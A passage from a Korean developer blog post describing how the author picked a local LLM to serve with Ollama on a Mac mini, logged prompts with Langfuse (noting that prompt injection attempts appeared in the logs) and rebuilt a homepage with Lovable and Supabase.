&#xBAA8;&#xB378;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#x201D; &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC3D;&#xC5C5; &#xC804; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB3C4; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xACE0;, &#xD604;&#xC7AC; &#xC5F0;&#xAD6C;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC131;&#xB2A5;&#xC758; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;&#xC694; &#x3160;&#x3160;</p><p>&#xD604;&#xC7AC; &#xC81C;&#xAC00; &#xC9D1;&#xC5D0;&#xC11C; LLM &#xCD94;&#xB860;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB294; &#xB9E5;&#xBBF8;&#xB2C8; &#xC785;&#xB2C8;&#xB2E4;. M4 Pro &#xCE69;&#xC744; &#xD0D1;&#xC7AC;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xB7A8;&#xC740; 64&#xAE30;&#xAC00; &#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0; Ollama &#xC11C;&#xBC84;&#xB97C; &#xC62C;&#xB9AC;&#xACE0; &#xBAA8;&#xB378;&#xC744; &#xC11C;&#xBE59;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://ollama.com/search">Ollama &#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xAC00;&#xBCF4;&#xC2DC;&#xBA74; &#xB7A8; 64&#xAE30;&#xAC00; &#xB0B4;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; gpt-oss, deepseek &#xB4F1; &#xBAA8;&#xB378; &#xC911;&#xC5D0;&#xC11C; &#xC800;&#xB294; 32B &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xC758; &#xBAA8;&#xB378;&#xB4E4; &#xC911; q8&#xB85C; &#xC591;&#xC790;&#xD654;&#xB41C; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xC88B;&#xC544;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xB4E4;&#xC5B4;&#xBCF4;&#xC790;&#xBA74;:</p><ul><li>70B q4 &#xBAA8;&#xB378;&#xB4E4;(&#xB2E4;&#xC6B4;&#xBC1B;&#xC73C;&#xBA74; &#xC57D; 40G &#xC815;&#xB3C4;)&#xC744; &#xB7A8; 64&#xAE30;&#xAC00;&#xC5D0;&#xC11C; &#xB3CC;&#xB9B4; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xB2F9;&#xC2DC; 70B &#xBAA8;&#xB378;&#xB4E4;&#xC740; &#xB098;&#xC628;&#xC9C0; &#xC870;&#xAE08; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB09C; &#xBAA8;&#xB378;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAE34; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xC704;&#xD55C; &#xACF5;&#xAC04;&#xB3C4; &#xB0A8;&#xACA8;&#xB46C;&#xC57C;&#xD55C;&#xB2E4; &#xC0DD;&#xAC01;&#xD574;&#xC11C; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC4F0;&#xBA74; &#xC88B;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>8&#xC6D4; &#xC911;&#xC21C;&#xCBE4;&#xC5D0; &#xB098;&#xC628; &#xD56B;&#xD55C; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xACE0; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. gpt-oss&#xC758; &#xACBD;&#xC6B0; 20B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xACE0;, qwen3&#xC5D0;&#xB294; 32B&#xACFC; 30B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xC8E0;. &#xC774; &#xBAA8;&#xB378;&#xB4E4; &#xACBD;&#xC6B0;, &#xCCB4;&#xAC10;&#xC0C1; &#xCD5C;&#xC2E0; ChatGPT 4o &#xC815;&#xB3C4; &#xD639;&#xC740; &#xADF8;&#xBCF4;&#xB2E4; &#xC0B4;&#xC9DD; &#xB354; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xB0B4;&#xB294; &#xB4EF; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC778; phi4 14B, gemma 27B &#xB4F1;&#xC744; &#xC81C;&#xAC00; &#xBBF8;&#xB9AC; &#xC138;&#xD305;&#xD574;&#xB454; &#xBA87; &#xAC1C;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xBA74;&#xC11C; &#xC131;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC5EC;&#xB7EC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xAC70;&#xCE5C; &#xACB0;&#xACFC; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p>&#xB2F9;&#xC5F0;&#xD55C;&#xAC70;&#xC9C0;&#xB9CC; MoE &#xBAA8;&#xB378;&#xC774; &#xC77C;&#xBC18; &#xBAA8;&#xB378;&#xBCF4;&#xB2E4; &#xCD94;&#xB860;&#xC18D;&#xB3C4;&#xAC00; &#xD6E8;&#xC52C; &#xBE60;&#xB985;&#xB2C8;&#xB2E4;. Qwen3 32B q8 &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, 7 tps &#xC815;&#xB3C4;&#xC758; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC654;&#xACE0; Qwen 30B MoE &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0; &#xB192;&#xC73C;&#xBA74; 45 tps&#xAE4C;&#xC9C0; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC18C;&#xADDC;&#xBAA8; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>Reasoning &#xBAA8;&#xB378;&#xC778; qwen3:30b-a3b-thinking-2507&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD14C;&#xC2A4;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Reasoning&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC; &#xBAA8;&#xB378;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC9C0; &#xC5BC;&#xB9C8; &#xC548;&#xB41C; &#xBAA8;&#xB378;&#xC774;&#xB77C; &#xADF8;&#xB7EC;&#xB824;&#xB2C8; &#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xC548; &#xC37C;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li>&#xB2E4;&#xB978; Reasoning &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xCD9C;&#xB825;&#xC774; &#xC644;&#xB8CC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xAC78;&#xB9B0;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. instruct &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC5B4;&#xC9C0;&#xAC04;&#xD55C; &#xCD9C;&#xB825;&#xAE4C;&#xC9C0;&#xB294; 2&#xBD84; &#xC548;&#xC5D0; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC9C0;&#xB9CC; reasoning&#xC744; &#xD558;&#xB294; &#xC21C;&#xAC04; 1~2&#xBD84;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; reasoning&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC131;&#xB2A5;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694;.</li><li>&#xC774;&#xBCF4;&#xB2E4; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD55C;&#xBC88;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC131;&#xB2A5;&#xC774; &#xB5A8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. phi4 14B &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, &#xC131;&#xB2A5;&#xC740; &#xCDA9;&#xBD84;&#xD588;&#xC9C0;&#xB9CC; fp16 &#xBAA8;&#xB378;&#xC744; &#xC368;&#xC57C; &#xC131;&#xB2A5;&#xC774; &#xC4F8;&#xB9CC;&#xD55C; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xB098;&#xC654;&#xB294;&#xB370;, reasoning &#xC2DC;&#xAC04;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4; &#xC2E4;&#xC0AC;&#xC6A9;&#xC5D0;&#xB294; &#xBB34;&#xB9AC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC678; Qwen3 14B, 8B, Gemma 27B, Deepseek 14B &#xB4F1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xACF5;&#xC218;&#xAC00; &#xB354; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; &#xACE0;&#xB824;&#xC0AC;&#xD56D; &#xC911;&#xC5D0; &#xC18D;&#xB3C4;, &#xC131;&#xB2A5;, &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;&#xC744; &#xACE0;&#xB824;&#xD588;&#xC744; &#xB54C; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC81C;&#xC77C; &#xC801;&#xD569;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBAA8;&#xB378;&#xC744; &#xC815;&#xD588;&#xC73C;&#xB2C8; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC138;&#xD305;&#xD558;&#xACE0; <code>ollama serve</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xB9CC;&#xD558;&#xBA74; &#xC900;&#xBE44; &#xB05D;!&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;"><a href="#2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;" class="headerlink" title="2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;"></a>2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;</h1><p>&#xC774;&#xAC83;&#xB3C4; &#xC5ED;&#xC2DC; &#x201C;LangSmith &#xC4F0;&#xBA74; &#xB418;&#xB294;&#xAC70; &#xC544;&#xB0D0;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2E4;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC5ED;&#xC2DC; &#xC194;&#xB8E8;&#xC158; &#xAC1C;&#xBC1C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD24;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xCC38;&#xC5D0; Langfuse&#xB97C; &#xC368;&#xBCF4;&#xC790;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Langfuse&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB798;&#xD3EC;&#xC5D0;&#xC11C; &#xBC1B;&#xC544; &#xBC14;&#xB85C; &#xB3C4;&#xCEE4;&#xB85C; &#xC62C;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, langchain&#xC5D0; langfuse&#xC758; callbackhandler&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC758; &#xB85C;&#xAE45;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>&#xB85C;&#xAE45;&#xC744; &#xD558;&#xBA74; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xC804;&#xC1A1;&#xC774; &#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xC751;&#xB2F5;&#xC758; &#xD004;&#xB9AC;&#xD2F0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB098; &#xC2E4;&#xD589; &#xCCB4;&#xC778;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;.</p><p>&#xADF8;&#xB9AC;&#xACE0;! &#xACF5;&#xACA9;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xC778;&#xC81D;&#xC158; &#xACF5;&#xACA9;&#xC774; &#xB0A0;&#xB77C;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xBCBD;&#xAE4C;&#xC9C0; &#xC5F4;&#xC2EC;&#xD788; &#xD558;&#xC168;&#xB294;&#xB370;&#x2026; &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC6D0;&#xD558;&#xC2DC;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xAC00;&#xC838;&#xAC00;&#xC9C0; &#xBABB;&#xD558;&#xC2E0; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>&#xC6D0;&#xB798; &#xC800;&#xD76C; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xB294; Base44&#xB85C; &#xAC1C;&#xBC1C;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB124;, &#xBA87; &#xB2EC; &#xC804;&#xC5D0; <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">$80M&#xC5D0; Wix&#xC5D0; &#xC778;&#xC218;&#xB41C; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xC774; &#xAE30;&#xC0AC;&#xB97C; &#xBCF4;&#xACE0; &#xC368;&#xBD24;&#xB294;&#xB370;&#xC694;, &#xAC04;&#xB2E8;&#xD55C; &#xB79C;&#xB529;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0;&#xB294; &#xAD1C;&#xCC2E;&#xC558;&#xB294;&#xB370;, &#xB85C;&#xADF8;&#xC778; &#xAE30;&#xB2A5; &#xC774;&#xD6C4;&#xB85C; &#xBB38;&#xC81C;&#xAC00; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xAC1C;&#xBC1C;&#xD560; &#xB54C;&#xB294; &#xC815;&#xB9D0; &#xCD5C;&#xC545;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC2DC; &#xBB58; &#xC4F8;&#xAE4C; &#xCC3E;&#xC544;&#xBCF4;&#xB358; &#xC911; &#x201C;Lovable&#xC774;&#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC694;&#xC998; &#xD56B;&#xD558;&#xB2E4;&#xB354;&#xB77C;&#x201D;&#xB294; &#xC598;&#xAE30;&#xB97C; &#xB4E3;&#xACE0; &#xC77C;&#xB2E8; &#xC368;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB611;&#xAC19;&#xC774; &#xBA3C;&#xC800; &#xBC30;&#xAEF4;&#xC628; &#xB4A4; &#xB85C;&#xADF8;&#xC778;&#xBD80;&#xD130; &#xAC1C;&#xBC1C;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; Supabase&#xB97C; &#xC5F0;&#xACB0;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Base44&#xC640; &#xB2EC;&#xB9AC; Supabase&#xB791; &#xBC14;&#xB85C; &#xC5F0;&#xB3D9;&#xB3C4; &#xB418;&#xACE0;, &#xB514;&#xBE44; &#xAD00;&#xB9AC;&#xD558;&#xAE30;&#xB3C4; &#xD3B8;&#xD558;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xB300;&#xADDC;&#xBAA8; &#xACE0;&#xAC1D;&#xC744; &#xAC10;&#xB2F9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD798;&#xB4E4;&#xAE34;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;&#xC694;(&#xC81C; &#xC9C0;&#xAC11;&#xC774;) &#xC774;&#xB807;&#xAC8C; &#xC5F0;&#xB3D9;&#xC744; &#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB9CC;&#xB4E4;&#xBA74;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>&#xB124;&#x2026; &#xBB50; &#xC27D;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xBA87; &#xBC88;&#xC758; &#xD2B8;&#xB77C;&#xC774;&#xB9CC;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAE34;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xB4A4;&#xC5D0;&#xB294; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;? &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC798; &#xC791;&#xC131;&#xD574;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC704; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD55C;&#xBC88;&#xC73C;&#xB85C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD55C;&#xBC88;&#xC5D0; &#xB410;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; Lovable &#xC8FC;&#xC2DD;&#xC744; &#xAD6C;&#xD558;&#xB7EC; &#xB2E4;&#xB154;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC5EC;&#xC804;&#xD788; &#xBB38;&#xC81C;&#xB294; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. API &#xD0A4;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C;&#xB294; &#xC798; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC; Supabase&#xC5D0; &#xC800;&#xC7A5;&#xD560; &#xB54C; API &#xD0A4; &#xC77C;&#xBD80;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;(<em>*</em>) &#xCC98;&#xB9AC;&#xD55C; &#xC0C1;&#xD0DC;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB358;&#xAC00;, &#xC784;&#xC758;&#xB85C; &#xBC84;&#xD2BC;&#xC744; &#xC5C6;&#xC564;&#xB2E4;&#xB358;&#xAC00; &#xB4F1;&#xB4F1; &#xC790;&#xC798;&#xD558;&#xAC8C; &#xC2E0;&#xACBD;&#xC368;&#xC57C;&#xD560; &#xAC83;&#xB4E4;&#xC774; &#xC880; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xAD6C;&#xD604;&#xD560; 